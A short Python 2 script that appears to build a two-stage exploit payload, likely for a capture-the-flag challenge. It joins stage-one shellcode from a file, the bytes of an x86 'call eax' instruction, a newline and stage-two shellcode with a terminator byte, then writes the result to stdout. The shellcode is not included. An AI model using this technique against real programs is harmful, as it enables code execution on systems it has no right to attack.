#!/usr/bin/python2

import sys

fh = open('stage_1_cleaned', 'rb')
stage_1 = fh.read()
fh.close()

fh = open('stage_2', 'rb')
stage_2 = fh.read()
fh.close()

STAGE_1_SPACING    = "AAAA"

STAGE_1_ADDRESS    = chr(0xff) + chr(0xd0)
STAGE_2_TERMINATOR = chr(0x99)

sys.stdout.write(stage_1 + STAGE_1_ADDRESS + chr(0x0a))
sys.stdout.write(stage_2 + STAGE_2_TERMINATOR)
